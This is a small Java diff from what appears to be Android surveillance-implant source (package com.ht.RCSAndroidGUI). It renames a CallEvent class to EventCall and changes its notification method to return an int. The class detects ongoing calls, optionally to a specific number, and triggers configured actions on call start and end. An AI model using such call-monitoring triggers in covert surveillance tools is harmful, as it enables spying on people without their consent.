@@ -10,9 +10,9 @@ import com.ht.RCSAndroidGUI.listener.ListenerCall;
 import com.ht.RCSAndroidGUI.util.DataBuffer;
 import com.ht.RCSAndroidGUI.util.WChar;
 
-public class CallEvent extends EventBase implements Observer<Call> {
+public class EventCall extends EventBase implements Observer<Call> {
 		/** The Constant TAG. */
-		private static final String TAG = "CallEvent";
+		private static final String TAG = "EventCall";
 
 		private int actionOnExit, actionOnEnter;
 		private String number;
@@ -61,32 +61,34 @@ public class CallEvent extends EventBase implements Observer<Call> {
 			// TODO Auto-generated method stub
 		}
 
-		public void notification(Call c) {
+		public int notification(Call c) {
 			// Nel range
 			if (c.isOngoing() && inCall == false) {
 				// Match any number
 				if (number.length() == 0) {
 					inCall = true;
 					onEnter();
-					return;
+					return 0;
 				}
 				
 				// Match a specific number
 				if (c.getNumber().contains(number)) {
 					inCall = true;
 					onEnter();
-					return;
+					return 0;
 				}
 				
-				return;
+				return 0;
 			} 
 			
 			if (c.isOngoing() == false && inCall == true) {
 				inCall = false;
 				
 				onExit();
-				return;
+				return 0;
 			}
+			
+			return 0;
 		}
 		
 		public void onEnter() {
